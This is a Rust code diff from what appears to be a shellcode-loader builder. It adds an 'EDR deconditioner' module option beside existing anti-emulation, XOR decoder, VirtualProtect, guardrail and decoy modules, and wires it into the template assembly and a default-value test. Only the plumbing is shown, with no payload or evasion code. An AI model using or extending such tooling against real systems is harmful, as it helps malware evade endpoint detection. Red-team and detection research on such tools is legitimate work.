@@ -20,6 +20,8 @@ pub struct ModuleSelection {
     pub decoder: String,
     /// Anti-emulation module: "none", "sirallocalot", "timeraw"
     pub antiemulation: String,
+    /// EDR deconditioner module: "none", "alloc_loop"
+    pub deconditioner: String,
     /// Guardrail module: "none", "env"
     pub guardrail: String,
     /// VirtualProtect module: "standard", "undersized"
@@ -35,6 +37,7 @@ impl ModuleSelection {
             carrier: "alloc_rw_rx".to_string(),
             decoder: "xor".to_string(),
             antiemulation: "none".to_string(),
+            deconditioner: "none".to_string(),
             guardrail: "none".to_string(),
             virtualprotect: "standard".to_string(),
             decoy: "none".to_string(),
@@ -66,6 +69,13 @@ impl ModuleSelection {
                 modules_dir
                     .join("antiemulation")
                     .join(format!("{}.c", self.antiemulation)),
+            ),
+            (
+                "deconditioner",
+                &self.deconditioner,
+                modules_dir
+                    .join("deconditioner")
+                    .join(format!("{}.c", self.deconditioner)),
             ),
             (
                 "guardrail",
@@ -135,6 +145,7 @@ impl Assembler {
             carrier = %modules.carrier,
             decoder = %modules.decoder,
             antiemulation = %modules.antiemulation,
+            deconditioner = %modules.deconditioner,
             guardrail = %modules.guardrail,
             virtualprotect = %modules.virtualprotect,
             decoy = %modules.decoy,
@@ -159,6 +170,10 @@ impl Assembler {
             .replace(
                 "// @MODULE:antiemulation",
                 &self.read_module(&format!("antiemulation/{}.c", modules.antiemulation))?,
+            )
+            .replace(
+                "// @MODULE:deconditioner",
+                &self.read_module(&format!("deconditioner/{}.c", modules.deconditioner))?,
             )
             .replace(
                 "// @MODULE:guardrail",
@@ -308,6 +323,7 @@ mod tests {
         assert_eq!(selection.carrier, "alloc_rw_rx");
         assert_eq!(selection.decoder, "xor");
         assert_eq!(selection.antiemulation, "none");
+        assert_eq!(selection.deconditioner, "none");
         assert_eq!(selection.guardrail, "none");
         assert_eq!(selection.virtualprotect, "standard");
         assert_eq!(selection.decoy, "none");
